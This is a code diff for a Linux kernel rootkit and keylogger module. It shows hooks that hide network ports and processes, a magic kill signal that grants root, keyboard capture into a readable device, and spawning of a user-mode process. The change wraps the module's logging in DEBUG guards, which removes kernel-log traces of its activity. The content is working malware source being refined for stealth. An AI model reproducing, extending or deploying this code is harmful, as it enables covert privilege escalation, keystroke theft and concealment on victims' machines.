@@ -122,8 +122,10 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
     if (v != SEQ_START_TOKEN) {
 		is = (struct inet_sock *)v;
 		if (hide_port != -1 && (port_ton == is->inet_sport || port_ton == is->inet_dport)) {
+            #ifdef DEBUG
 			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
 				   ntohs(is->inet_sport), ntohs(is->inet_dport));
+            #endif
 			return 0;
 		}
 	}
@@ -315,7 +317,9 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 		case 64:
 			/* If we receive the magic signal, then we just sprintf the pid
 			* from the intercepted arguments into the hide_pid string */
+        #ifdef DEBUG
 			printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
+            #endif
 			sprintf(hide_pid, "%d", pid);
 			return 0;
 		case 87: 
@@ -326,7 +330,9 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 			memset(input_buf, 0, BUFLEN);
 			return 0;
 		case 52:
+        #ifdef DEBUG
 			printk(KERN_INFO "rootkit: giving root...\n");
+            #endif
 			set_root();
 			return 0;
         #ifdef HIDE_MODULE
@@ -493,7 +499,9 @@ asmlinkage int hook_kill(pid_t pid, int sig)
 		case 64:
 			/* If we receive the magic signal, then we just sprintf the pid
 			* from the intercepted arguments into the hide_pid string */
+            #ifdef DEBUG
 			printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
+            #endif
 			sprintf(hide_pid, "%d", pid);
 			return 0;
 		case 87: 
@@ -504,7 +512,9 @@ asmlinkage int hook_kill(pid_t pid, int sig)
 			memset(input_buf, 0, BUFLEN);
 			return 0;
 		case 52:
+            #ifdef DEBUG
 			printk(KERN_INFO "rootkit: giving root...\n");
+            #endif
 			set_root();
 			return 0;
         #ifdef HIDE_MODULE
@@ -551,8 +561,10 @@ static ssize_t kl_device_read(struct file *fp, char __user *buf, size_t len,
 
 	ret = copy_to_user(buf, input_buf, buflen);
 	if (ret) {
+        #ifdef DEBUG
 		printk(KERN_ERR
 		       "keylog: Unable to copy from kernel buffer to user space buffer\n");
+               #endif
 		return -ret;
 	}
 
@@ -600,7 +612,9 @@ static int spawnProcess(char* path) {
 		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
         
 	rc = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    #ifdef DEBUG
 	printk("RC is: %i \n", rc);
+    #endif
 	return rc;
 }
 
@@ -618,12 +632,16 @@ static int __init kl_init(void)
 	debugfs_create_u32("major", 0400, subdir, &major);
 	ret = register_chrdev(0, DEVICE_NAME, &fops);
 	if (ret < 0) {
+        #ifdef DEBUG
 		printk(KERN_ERR
 		       "keylog: Unable to register character device\n");
+        #endif
 		return ret;
 	}
 	major = ret;
+    #ifdef DEBUG
 	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
+    #endif
 	protect_memory();
 	ret = register_keyboard_notifier(&kl_notifier_block);
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
@@ -631,12 +649,16 @@ static int __init kl_init(void)
 		return err;
 	unprotect_memory();
 	if (ret) {
+        #ifdef DEBUG
 		printk(KERN_ERR
 		       "keylog: Unable to register keyboard notifier\n");
+        #endif
 		return -ret;
 	}
 	i = spawnProcess(target_process);
+    #ifdef DEBUG
     printk(KERN_INFO "keylog: return value %d\n",i);
+    #endif
 
 	memset(input_buf, 0, BUFLEN);
 
